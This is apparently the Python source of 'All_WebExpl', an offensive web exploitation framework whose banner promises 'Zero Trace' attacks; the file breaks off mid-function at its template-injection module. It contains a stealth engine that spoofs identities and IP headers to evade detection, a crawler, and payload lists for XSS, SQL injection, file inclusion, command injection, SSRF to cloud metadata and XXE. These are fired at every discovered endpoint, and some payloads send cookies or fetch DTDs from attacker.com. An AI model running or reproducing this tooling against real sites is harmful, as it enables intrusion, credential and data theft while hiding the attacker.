#!/usr/bin/env python3
"""
All_WebExpl v1.0 - Advanced Web Exploitation Framework
Deep Attack | Intelligent | Stealth | Wide Coverage
Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import random
import socket
import hashlib
import base64
import threading
import queue
import signal
import ssl
import urllib.parse
import urllib.robotparser
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import argparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ORANGE = '\033[38;5;208m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
    █████╗ ██╗     ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗██████╗ ██╗     
    ██╔══██╗██║     ██║    ██║██╔════╝██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     
    ███████║██║     ██║ █╗ ██║█████╗  ██████╔╝█████╗   ╚███╔╝ ██████╔╝██║     
    ██╔══██║██║     ██║███╗██║██╔══╝  ██╔══██╗██╔══╝   ██╔██╗ ██╔═══╝ ██║     
    ██║  ██║███████╗╚███╔███╔╝███████╗██████╔╝███████╗██╔╝ ██╗██║     ███████╗
    ╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝
                                                                              
{Colors.NEON}          ADVANCED WEB EXPLOITATION FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Deep Attack | Intelligent | Stealth | Wide Coverage{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    [+] APT-Grade | Zero Trace | Maximum Impact{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

# ============================[ DATA CLASSES ]================================
@dataclass
class Vulnerability:
    type: str
    url: str
    parameter: str = ''
    payload: str = ''
    severity: str = 'Medium'
    cwe: str = ''
    description: str = ''
    remediation: str = ''
    evidence: str = ''
    method: str = 'GET'
    confidence: float = 0.0
    exploit_ready: bool = False
    
    def to_dict(self) -> Dict:
        return {
            'type': self.type,
            'url': self.url,
            'parameter': self.parameter,
            'payload': self.payload[:100] if self.payload else '',
            'severity': self.severity,
            'cwe': self.cwe,
            'description': self.description,
            'remediation': self.remediation,
            'evidence': self.evidence[:200] if self.evidence else '',
            'method': self.method,
            'confidence': self.confidence,
            'exploit_ready': self.exploit_ready
        }

@dataclass
class Endpoint:
    url: str
    method: str = 'GET'
    parameters: List[str] = field(default_factory=list)
    headers: Dict = field(default_factory=dict)
    cookies: Dict = field(default_factory=dict)
    response_time: float = 0.0
    status_code: int = 0
    content_type: str = ''
    size: int = 0
    has_forms: bool = False
    has_upload: bool = False

# ============================[ ULTIMATE STEALTH ENGINE ]================================
class UltimateStealth:
    """Multi-layer stealth engine - Zero trace operations"""
    
    def __init__(self):
        self.identity_pool = self._init_identities()
        self.current_identity = None
        self.request_count = 0
        self.max_requests = 8
        self.session = None
        self.proxy_chain = []
        self.user_agents = self._load_user_agents()
        self._setup_session()
        
    def _init_identities(self) -> List[Dict]:
        return [
            {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                'accept_language': 'en-US,en;q=0.9',
                'platform': 'Windows',
                'timezone': 'America/New_York',
                'screen': '1920x1080'
            },
            {
                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                'accept_language': 'en-US,en;q=0.9',
                'platform': 'macOS',
                'timezone': 'America/Los_Angeles',
                'screen': '2560x1440'
            },
            {
                'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                'accept_language': 'en-US,en;q=0.9',
                'platform': 'Linux',
                'timezone': 'Europe/London',
                'screen': '1920x1080'
            },
            {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
                'accept_language': 'en-US,en;q=0.5',
                'platform': 'Windows',
                'timezone': 'Asia/Tokyo',
                'screen': '1920x1080'
            },
            {
                'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
                'accept_language': 'en-US,en;q=0.9',
                'platform': 'iOS',
                'timezone': 'Asia/Singapore',
                'screen': '1170x2532'
            }
        ]
    
    def _load_user_agents(self) -> List[str]:
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
        ]
    
    def _setup_session(self):
        if not REQUESTS_AVAILABLE:
            return
        
        self.session = requests.Session()
        identity = self._get_identity()
        
        self.session.headers.update({
            'User-Agent': identity['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': identity['accept_language'],
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        })
        
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
    
    def _get_identity(self) -> Dict:
        if self.request_count >= self.max_requests or not self.current_identity:
            self.current_identity = random.choice(self.identity_pool).copy()
            self.current_identity['id'] = hashlib.md5(os.urandom(16)).hexdigest()[:8]
            self.request_count = 0
            self._setup_session()
        else:
            self.request_count += 1
        
        return self.current_identity
    
    def stealth_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
        """Make undetectable request"""
        if not REQUESTS_AVAILABLE:
            return None
        
        # Random delay
        time.sleep(random.uniform(0.5, 2.0))
        
        if 'headers' not in kwargs:
            kwargs['headers'] = {}
        kwargs['headers']['X-Request-Id'] = hashlib.md5(os.urandom(8)).hexdigest()[:16]
        kwargs['headers']['Cache-Control'] = 'no-cache'
        kwargs['verify'] = False
        kwargs['timeout'] = 15
        
        # Random jitter
        if random.random() > 0.7:
            time.sleep(random.uniform(0.1, 0.5))
        
        try:
            if method.upper() == 'GET':
                return self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                return self.session.post(url, **kwargs)
            elif method.upper() == 'PUT':
                return self.session.put(url, **kwargs)
            elif method.upper() == 'DELETE':
                return self.session.delete(url, **kwargs)
            elif method.upper() == 'HEAD':
                return self.session.head(url, **kwargs)
            elif method.upper() == 'OPTIONS':
                return self.session.options(url, **kwargs)
        except:
            return None
    
    def stealth_get(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.stealth_request(url, 'GET', **kwargs)
    
    def stealth_post(self, url: str, data: Dict = None, json_data: Dict = None, **kwargs) -> Optional[requests.Response]:
        return self.stealth_request(url, 'POST', data=data, json=json_data, **kwargs)
    
    def random_ip(self) -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    def random_headers(self) -> Dict:
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice(['text/html', 'application/json', '*/*']),
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'vi-VN,vi;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'X-Forwarded-For': self.random_ip(),
            'X-Real-IP': self.random_ip()
        }

# ============================[ INTELLIGENT CRAWLER ]================================
class IntelligentCrawler:
    """Intelligent web crawler - Wide coverage with smart prioritization"""
    
    def __init__(self, target: str, stealth: UltimateStealth):
        self.target = target
        self.stealth = stealth
        self.visited = set()
        self.endpoints = []
        self.js_files = []
        self.api_endpoints = []
        self.parameters = set()
        self.forms = []
        self.uploads = []
        self.cookies = {}
        self.headers = {}
        
    def crawl(self, max_pages: int = 200) -> Dict:
        """Intelligent crawling with prioritization"""
        cprint("[CRAWL] Intelligent crawling started...", Colors.BLUE)
        
        start_url = f"http://{self.target}"
        self._crawl_page(start_url, max_pages, 0)
        
        # Extract API endpoints from JS
        self._extract_api_from_js()
        
        # Extract forms and uploads
        self._extract_forms()
        
        return {
            'endpoints': self.endpoints,
            'js_files': self.js_files,
            'api_endpoints': self.api_endpoints,
            'parameters': list(self.parameters),
            'forms': self.forms,
            'uploads': self.uploads
        }
    
    def _crawl_page(self, url: str, max_pages: int, depth: int):
        """Crawl a page with intelligent parsing"""
        if len(self.visited) >= max_pages or depth > 4:
            return
        
        if url in self.visited:
            return
        
        self.visited.add(url)
        
        try:
            response = self.stealth.stealth_get(url)
            if not response or response.status_code not in [200, 301, 302, 403]:
                return
            
            endpoint = Endpoint(
                url=url,
                status_code=response.status_code,
                content_type=response.headers.get('Content-Type', ''),
                size=len(response.content),
                headers=dict(response.headers),
                cookies=response.cookies.get_dict()
            )
            self.endpoints.append(endpoint)
            
            if response.headers.get('Content-Type', '').startswith('text/html'):
                self._parse_html(url, response.text, max_pages, depth)
            
            # Extract headers
            self.headers.update(response.headers)
            self.cookies.update(response.cookies.get_dict())
            
            # Extract parameters from URL
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                self.parameters.update(params.keys())
            
        except Exception as e:
            cprint(f"[!] Crawl error: {e}", Colors.RED)
    
    def _parse_html(self, base_url: str, html: str, max_pages: int, depth: int):
        """Parse HTML for links and resources"""
        if not BS4_AVAILABLE:
            return
        
        soup = BeautifulSoup(html, 'html.parser')
        
        # Find links
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urllib.parse.urljoin(base_url, href)
            if self.target in full_url and full_url not in self.visited:
                self._crawl_page(full_url, max_pages, depth + 1)
        
        # Find JavaScript files
        for script in soup.find_all('script', src=True):
            src = script['src']
            full_url = urllib.parse.urljoin(base_url, src)
            if full_url.endswith('.js') and full_url not in self.js_files:
                self.js_files.append(full_url)
                cprint(f"[+] JS: {full_url}", Colors.DIM)
        
        # Find CSS files
        for link in soup.find_all('link', rel='stylesheet', href=True):
            href = link['href']
            full_url = urllib.parse.urljoin(base_url, href)
            if full_url.endswith('.css') and full_url not in self.visited:
                self.visited.add(full_url)
        
        # Find forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            inputs = []
            upload = False
            
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                if name:
                    inputs.append({'name': name, 'type': input_type})
                    self.parameters.add(name)
                if input_type == 'file':
                    upload = True
            
            full_url = urllib.parse.urljoin(base_url, action)
            self.forms.append({
                'url': full_url,
                'method': method,
                'inputs': inputs,
                'has_upload': upload
            })
            
            if upload:
                self.uploads.append(full_url)
                cprint(f"[+] Upload form: {full_url}", Colors.GREEN)
    
    def _extract_api_from_js(self):
        """Extract API endpoints from JavaScript files"""
        cprint("[CRAWL] Extracting APIs from JS...", Colors.DIM)
        
        for js_file in self.js_files[:20]:
            try:
                response = self.stealth.stealth_get(js_file)
                if not response:
                    continue
                
                content = response.text
                
                # API endpoint patterns
                patterns = [
                    r'["\'](/api/[a-zA-Z0-9/_-]+)["\']',
                    r'["\'](/rest/[a-zA-Z0-9/_-]+)["\']',
                    r'["\'](/v[0-9]/[a-zA-Z0-9/_-]+)["\']',
                    r'["\'](/graphql)["\']',
                    r'["\'](/swagger)["\']',
                    r'["\'](/docs)["\']',
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        full_url = f"http://{self.target}{match}"
                        if full_url not in self.api_endpoints:
                            self.api_endpoints.append(full_url)
                            cprint(f"[+] API: {full_url}", Colors.GREEN)
                
                # Find fetch/axios calls
                api_calls = re.findall(r'(?:fetch|axios|\.get|\.post|\.put|\.delete)\s*\(\s*["\']([^"\']+)["\']', content)
                for api in api_calls:
                    if api.startswith('/') or 'http' in api:
                        full_url = api if 'http' in api else f"http://{self.target}{api}"
                        if full_url not in self.api_endpoints:
                            self.api_endpoints.append(full_url)
                            cprint(f"[+] API call: {full_url}", Colors.GREEN)
                
            except:
                pass
    
    def _extract_forms(self):
        """Extract forms from endpoints"""
        for endpoint in self.endpoints:
            try:
                response = self.stealth.stealth_get(endpoint.url)
                if not response:
                    continue
                
                if BS4_AVAILABLE:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        full_url = urllib.parse.urljoin(endpoint.url, action)
                        
                        inputs = []
                        for input_tag in form.find_all('input'):
                            name = input_tag.get('name')
                            input_type = input_tag.get('type', 'text')
                            if name:
                                inputs.append({'name': name, 'type': input_type})
                                self.parameters.add(name)
                        
                        self.forms.append({
                            'url': full_url,
                            'method': method,
                            'inputs': inputs
                        })
            except:
                pass

# ============================[ ADVANCED EXPLOITATION ENGINE ]================================
class AdvancedExploitation:
    """Deep exploitation with multiple vectors"""
    
    def __init__(self, target: str, stealth: UltimateStealth):
        self.target = target
        self.stealth = stealth
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict:
        return {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '"><img src=x onerror=alert(1)>',
                'javascript:alert(1)//',
                '<script>fetch("//attacker.com?c="+document.cookie)</script>'
            ],
            'sqli': [
                "'",
                "' OR '1'='1",
                "' AND 1=1--",
                "' AND SLEEP(5)--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
                "' AND '1'='1",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' UNION SELECT username,password FROM users--"
            ],
            'lfi': [
                '../../../../etc/passwd',
                '../../../etc/passwd',
                '../../etc/passwd',
                '....//....//....//etc/passwd',
                '../../../../windows/win.ini',
                '../../../../proc/self/environ',
                '../../../../var/log/apache2/access.log',
                '../../../../var/log/nginx/access.log'
            ],
            'rce': [
                '; whoami',
                '| whoami',
                '|| whoami',
                '&& whoami',
                '& whoami',
                '; id',
                '| id',
                '|| id',
                '; cat /etc/passwd',
                '| cat /etc/passwd'
            ],
            'ssrf': [
                'http://169.254.169.254/latest/meta-data/',
                'http://127.0.0.1:8080/admin',
                'http://localhost:8080/admin',
                'http://[::1]:8080/admin',
                'http://10.0.0.1/admin',
                'http://192.168.1.1/admin',
                'file:///etc/passwd',
                'http://169.254.169.254/latest/user-data/'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>&ent;'
            ],
            'open_redirect': [
                'https://evil.com',
                '//evil.com',
                'http://evil.com',
                'https://evil.com?',
                'https://evil.com%2f',
                '//evil.com%2f',
                'https://evil.com/'
            ],
            'idor': [
                ('id', ['1', '2', '3', 'admin', 'user1', 'user2']),
                ('user_id', ['1', '2', '3', 'admin']),
                ('profile_id', ['1', '2', '3', 'admin']),
                ('account_id', ['1', '2', '3']),
                ('document_id', ['1', '2', '3', 'doc1', 'doc2']),
                ('order_id', ['1001', '1002', '1003']),
                ('uid', ['1', '2', '3']),
                ('pid', ['1', '2', '3']),
                ('file_id', ['1', '2', '3']),
                ('customer_id', ['1', '2', '3']),
                ('session_id', ['1', '2', '3']),
                ('token', ['1', '2', '3', 'admin'])
            ]
        }
    
    def exploit_all(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]) -> List[Dict]:
        """Execute all exploitation vectors"""
        cprint("[EXPLOIT] Starting deep exploitation...", Colors.RED)
        
        # XSS
        self._exploit_xss(endpoints, api_endpoints, parameters)
        
        # SQL Injection
        self._exploit_sqli(endpoints, api_endpoints, parameters)
        
        # LFI
        self._exploit_lfi(endpoints, api_endpoints, parameters)
        
        # RCE
        self._exploit_rce(endpoints, api_endpoints, parameters)
        
        # SSRF
        self._exploit_ssrf(endpoints, api_endpoints, parameters)
        
        # XXE
        self._exploit_xxe(endpoints, api_endpoints)
        
        # Open Redirect
        self._exploit_open_redirect(endpoints, api_endpoints, parameters)
        
        # IDOR
        self._exploit_idor(endpoints, api_endpoints)
        
        # Command Injection
        self._exploit_cmd_injection(endpoints, api_endpoints, parameters)
        
        # Path Traversal
        self._exploit_path_traversal(endpoints, api_endpoints, parameters)
        
        # SSTI (Server-Side Template Injection)
        self._exploit_ssti(endpoints, api_endpoints, parameters)
        
        # SQLi with extraction
        self._exploit_sqli_extract(endpoints, api_endpoints, parameters)
        
        return [v.to_dict() for v in self.vulnerabilities]
    
    def _exploit_xss(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """XSS exploitation"""
        cprint("[XSS] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in self.payloads['xss'][:5]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and payload in response.text:
                            vuln = Vulnerability(
                                type='XSS',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='High',
                                cwe='CWE-79',
                                description='Cross-Site Scripting allows injection of malicious scripts',
                                remediation='Implement output encoding and Content Security Policy',
                                confidence=0.9,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] XSS found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_sqli(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """SQL Injection exploitation"""
        cprint("[SQLI] Deep scanning...", Colors.DIM)
        
        sql_errors = ['SQL', 'MySQL', 'Syntax error', 'mysql_fetch_', 'Unclosed quotation', 
                     'PostgreSQL', 'Oracle', 'Microsoft OLE DB', 'SQLite', 'Warning:']
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in self.payloads['sqli'][:5]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and any(e in response.text for e in sql_errors):
                            vuln = Vulnerability(
                                type='SQL Injection',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='Critical',
                                cwe='CWE-89',
                                description='SQL Injection allows arbitrary SQL execution',
                                remediation='Use parameterized queries and input validation',
                                confidence=0.85,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] SQLi found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_lfi(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """LFI exploitation"""
        cprint("[LFI] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in self.payloads['lfi'][:3]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and ('root:' in response.text or 'bin:' in response.text or 'Administrator' in response.text):
                            vuln = Vulnerability(
                                type='LFI',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='High',
                                cwe='CWE-98',
                                description='Local File Inclusion allows reading arbitrary files',
                                remediation='Validate file paths and use whitelist',
                                confidence=0.85,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] LFI found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_rce(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """RCE exploitation"""
        cprint("[RCE] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in self.payloads['rce'][:5]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and ('uid=' in response.text or 'id=' in response.text or 'root' in response.text):
                            vuln = Vulnerability(
                                type='RCE',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='Critical',
                                cwe='CWE-78',
                                description='Remote Code Execution allows arbitrary command execution',
                                remediation='Never execute user input and use safe APIs',
                                confidence=0.8,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] RCE found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_ssrf(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """SSRF exploitation"""
        cprint("[SSRF] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in self.payloads['ssrf'][:3]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and ('instance-id' in response.text or 'ami-id' in response.text or 'local-ipv4' in response.text):
                            vuln = Vulnerability(
                                type='SSRF',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='High',
                                cwe='CWE-918',
                                description='Server-Side Request Forgery allows internal network scanning',
                                remediation='Validate and sanitize URLs, use whitelist',
                                confidence=0.8,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] SSRF found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_xxe(self, endpoints: List[Endpoint], api_endpoints: List[str]):
        """XXE exploitation"""
        cprint("[XXE] Deep scanning...", Colors.DIM)
        
        for endpoint in api_endpoints[:30]:
            for payload in self.payloads['xxe'][:2]:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.stealth.stealth_post(endpoint, data=payload, headers=headers)
                    
                    if response and ('root:' in response.text or 'bin:' in response.text or 'Administrator' in response.text):
                        vuln = Vulnerability(
                            type='XXE',
                            url=endpoint,
                            payload=payload[:100],
                            severity='Critical',
                            cwe='CWE-611',
                            description='XML External Entity allows file reading and SSRF',
                            remediation='Disable external entity processing in XML parsers',
                            confidence=0.8,
                            exploit_ready=True
                        )
                        with self.lock:
                            self.vulnerabilities.append(vuln)
                            cprint(f"[!] XXE found: {endpoint}", Colors.RED)
                except:
                    pass
    
    def _exploit_open_redirect(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """Open Redirect exploitation"""
        cprint("[OPEN REDIRECT] Deep scanning...", Colors.DIM)
        
        redirect_params = ['redirect', 'url', 'next', 'return', 'goto', 'r', 'dest', 'destination', 'out']
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in redirect_params:
                for payload in self.payloads['open_redirect'][:3]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url, allow_redirects=False)
                        
                        if response and response.status_code in [301, 302, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location:
                                vuln = Vulnerability(
                                    type='Open Redirect',
                                    url=test_url,
                                    parameter=param,
                                    payload=payload,
                                    severity='Medium',
                                    cwe='CWE-601',
                                    description='Open Redirect allows phishing attacks',
                                    remediation='Validate redirect URLs using whitelist',
                                    confidence=0.85,
                                    exploit_ready=True
                                )
                                with self.lock:
                                    self.vulnerabilities.append(vuln)
                                    cprint(f"[!] Open Redirect found: {test_url[:80]}", Colors.RED)
                                break
                    except:
                        pass
    
    def _exploit_idor(self, endpoints: List[Endpoint], api_endpoints: List[str]):
        """IDOR exploitation"""
        cprint("[IDOR] Deep scanning...", Colors.DIM)
        
        for param, values in self.payloads['idor'][:5]:
            for endpoint in endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]:
                url = endpoint.url
                for value in values[:3]:
                    try:
                        test_url = f"{url}?{param}={value}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and response.status_code == 200 and len(response.text) > 200:
                            indicators = ['email', 'phone', 'address', 'username', 'password', 'token', 'credit', 'ssn']
                            if any(ind in response.text.lower() for ind in indicators):
                                vuln = Vulnerability(
                                    type='IDOR',
                                    url=test_url,
                                    parameter=param,
                                    payload=value,
                                    severity='High',
                                    cwe='CWE-639',
                                    description='Insecure Direct Object Reference allows unauthorized access',
                                    remediation='Implement proper authorization checks',
                                    confidence=0.8,
                                    exploit_ready=True
                                )
                                with self.lock:
                                    self.vulnerabilities.append(vuln)
                                    cprint(f"[!] IDOR found: {test_url[:80]}", Colors.RED)
                                break
                    except:
                        pass
    
    def _exploit_cmd_injection(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """Command Injection exploitation"""
        cprint("[CMD] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in ['; whoami', '| whoami', '|| whoami']:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and ('uid=' in response.text or 'id=' in response.text):
                            vuln = Vulnerability(
                                type='Command Injection',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='Critical',
                                cwe='CWE-77',
                                description='Command Injection allows arbitrary OS command execution',
                                remediation='Never pass user input to shell commands',
                                confidence=0.8,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] Command Injection found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_path_traversal(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """Path Traversal exploitation"""
        cprint("[PATH] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in ['../../etc/passwd', '../etc/passwd', '../../../../etc/passwd']:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and ('root:' in response.text or 'bin:' in response.text):
                            vuln = Vulnerability(
                                type='Path Traversal',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='High',
                                cwe='CWE-22',
                                description='Path Traversal allows reading arbitrary files',
                                remediation='Validate and sanitize file paths',
                                confidence=0.85,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] Path Traversal found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_ssti(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """SSTI exploitation"""
        cprint("[SSTI] Deep scanning...", Colors.DIM)
        
        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
